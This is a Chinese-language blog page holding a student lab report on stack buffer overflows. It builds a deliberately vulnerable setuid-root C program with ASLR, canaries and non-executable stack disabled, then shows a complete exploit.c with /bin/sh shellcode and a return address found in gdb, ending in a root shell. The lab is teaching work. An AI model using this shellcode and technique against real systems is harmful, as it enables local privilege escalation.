@@ -1,0 +1,622 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.png">
+  <link rel="icon" href="/img/1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="代码漏洞分析与缓冲区溢出攻击一、实验目的 了解代码漏洞扫描的基本原理；  熟悉缓冲区溢出攻击与防御的基本技术 熟悉如何发现常见软件漏洞(stack overflow, double free, format string vulnerability, etc) 按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。  二、实验环境64位Kali linux    vmware workstat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码漏洞分析与缓冲区溢出攻击">
+<meta property="og:url" content="http://example.com/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="代码漏洞分析与缓冲区溢出攻击一、实验目的 了解代码漏洞扫描的基本原理；  熟悉缓冲区溢出攻击与防御的基本技术 熟悉如何发现常见软件漏洞(stack overflow, double free, format string vulnerability, etc) 按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。  二、实验环境64位Kali linux    vmware workstat">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20230304101250375.png">
+<meta property="article:published_time" content="2023-03-04T02:10:37.564Z">
+<meta property="article:modified_time" content="2023-03-04T07:51:52.465Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20230304101250375.png">
+  
+  
+  
+  <title>代码漏洞分析与缓冲区溢出攻击 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sugar</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="代码漏洞分析与缓冲区溢出攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-04 10:10" pubdate>
+          2023年3月4日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">代码漏洞分析与缓冲区溢出攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="代码漏洞分析与缓冲区溢出攻击"><a href="#代码漏洞分析与缓冲区溢出攻击" class="headerlink" title="代码漏洞分析与缓冲区溢出攻击"></a>代码漏洞分析与缓冲区溢出攻击</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
+<li>了解代码漏洞扫描的基本原理； </li>
+<li>熟悉缓冲区溢出攻击与防御的基本技术</li>
+<li>熟悉如何发现常见软件漏洞(stack overflow, double free, format string vulnerability, etc)</li>
+<li>按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。</li>
+</ol>
+<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p><strong>64位Kali linux</strong>    <strong>vmware workstation 16 player</strong></p>
+<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><p>​	缓冲区溢出是指程序试图向缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被恶意用户利用来改变程序的流控制，甚至执行代码的任意片段。这一漏洞的出现是由于数据缓冲器和返回地址的暂时关闭，溢出会引起返回地址被重写。</p>
+<h2 id="四、实验步骤与结果分析"><a href="#四、实验步骤与结果分析" class="headerlink" title="四、实验步骤与结果分析"></a>四、实验步骤与结果分析</h2><p>该实验我个人使用的是 64 位 Kali linux，而本次实验为了方便观察汇编语句，我们需要在 32 位环境下作 操作，因此实验之前需要做一些准备。</p>
+<p>（1）<strong>输入命令安装一些用于编译 32 位 C 程序的东西</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install -y lib32z1 libc6-dev-i386 lib32readline6-dev<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150033257.png" srcset="/img/loading.gif" lazyload alt="image-20230304150033257"></p>
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150020838.png" srcset="/img/loading.gif" lazyload alt="image-20230304150020838">（2)  <strong>初始设置</strong></p>
+<p><strong>关闭地址空间随机化</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150001996.png" srcset="/img/loading.gif" lazyload alt="image-20230304150001996"></p>
+<p>为了防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多 shell 程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root权限，所以我们需要使用一个没有此项保护的shell，例如：zsh，如下链接完毕</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150135987.png" srcset="/img/loading.gif" lazyload alt="image-20230304150135987"></p>
+<p>（3）<strong>shellcode</strong></p>
+<p>一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是 shellcode。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">char</span> *name[<span class="hljs-number">2</span>];<br>    name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">execve</span>(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此段代码对应的机器码如下：</p>
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150741432.png" srcset="/img/loading.gif" lazyload alt="image-20230304150741432"></p>
+<p>（4）漏洞程序，保存为stack.c</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">12</span>];<br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-built_in">fread</span>(str, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    <span class="hljs-built_in">bof</span>(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过代码可以知道，程序会读取一个名为“badfile”的文件，并将文件内容装入“buffer”。 </p>
+<p>（5）编译该程序，并设置 SET-UID。 </p>
+<p>​	GCC 编译器实现了一个名为 stackguard 的安全机制来防止缓冲区溢出。在存在这种保护的情况下， 缓冲区溢出攻击将不起作用。我们可以在编译期间使用-fno-stack-protector 选项禁用此保护。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c<br>sudo <span class="hljs-built_in">chown</span> root stack<br>sudo <span class="hljs-built_in">chmod</span> 4755 stack<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150602247.png" srcset="/img/loading.gif" lazyload alt="image-20230304150602247"></p>
+<p><strong>–fno-stack-protector</strong> 关闭<strong>canary</strong>保护机制</p>
+<p><strong>-g</strong> 增加调试信息，保证后面我们可以对stack进行调试</p>
+<p><strong>-z execstack</strong>   shellcode最终在栈里面执行，关闭<strong>栈不可执行</strong>的保护机制</p>
+<p>（6）攻击程序： <strong>exploit.c</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* exploit.c */</span><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>                  <span class="hljs-comment">//xorl %eax,%eax</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>                <span class="hljs-comment">//pushl $0x68732f2f</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>                <span class="hljs-comment">//pushl $0x6e69622f</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>                  <span class="hljs-comment">//movl %esp,%ebx</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                      <span class="hljs-comment">//pushl %ebx</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>                  <span class="hljs-comment">//movl %esp,%ecx</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                      <span class="hljs-comment">//cdq</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>                  <span class="hljs-comment">//movb $0x0b,%al</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>                  <span class="hljs-comment">//int $0x80</span><br>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span><br>    buffer[<span class="hljs-number">24</span>]=<span class="hljs-number">0xdd</span>;<br>    buffer[<span class="hljs-number">25</span>]=<span class="hljs-number">0xcf</span>;<br>    buffer[<span class="hljs-number">26</span>]=<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">27</span>]=<span class="hljs-number">0xff</span>;<br>    <span class="hljs-type">int</span> start=<span class="hljs-number">517</span>-<span class="hljs-built_in">strlen</span>(shellcode);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=start;i&lt;<span class="hljs-number">517</span>;i++)&#123;<br>        buffer[i]=shellcode[i-start];<br>    &#125;<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-built_in">fwrite</span>(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    <span class="hljs-built_in">fclose</span>(badfile);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>exploit.c</strong>文件用于生成<strong>badfile</strong>文件</p>
+<p>我们需要填充的部分就是将<strong>shellcode</strong>放进去，然后将<strong>return address</strong>的值修改为<strong>shellcode</strong>的入口地址即可，下面我们进行调试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb stack<br>b bof     //设置断点<br>r         //运行<br>next      //进入下一步<br>i r ebp   //查看ebp的值<br>i r esp   //查看esp的值<br>p &amp;buffer //查看数组buffer的起始地址<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304151656195.png" srcset="/img/loading.gif" lazyload alt="image-20230304151656195"></p>
+<p>ebp的地址0xffffce08+4的地方就是return address，这里我讲shellcode放在了buffer[517]里面最后的24字节，那这样shellcode的入口地址就应该是[&amp;buffer+517-strlen(shellcode)]&#x3D;0xffffcdf4+493&#x3D;0xffffcfdd；</p>
+<p>将入口地址0xffffcfdd填入到return address处，对应的buffer应该是buffer[24]、buffer[25]、buffer[26]、buffer[27]</p>
+<p>小端法存储，所以</p>
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152058897.png" srcset="/img/loading.gif" lazyload alt="image-20230304152058897"></p>
+<p>编译<strong>exploit.c</strong>，并运行<strong>exploit</strong>，此时生成了<strong>badfile</strong>文件，运行<strong>stack</strong>即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -o exploit exploit.c<br>./exploit<br>./stack<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152309622.png" srcset="/img/loading.gif" lazyload alt="image-20230304152309622"></p>
+<p>最终发现得到<strong>root</strong>权限的<strong>shell</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>代码漏洞分析与缓冲区溢出攻击</div>
+      <div>http://example.com/2023/03/04/代码漏洞分析与缓冲区溢出攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="Des算法的原理与实现">
+                        <span class="hidden-mobile">Des算法的原理与实现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
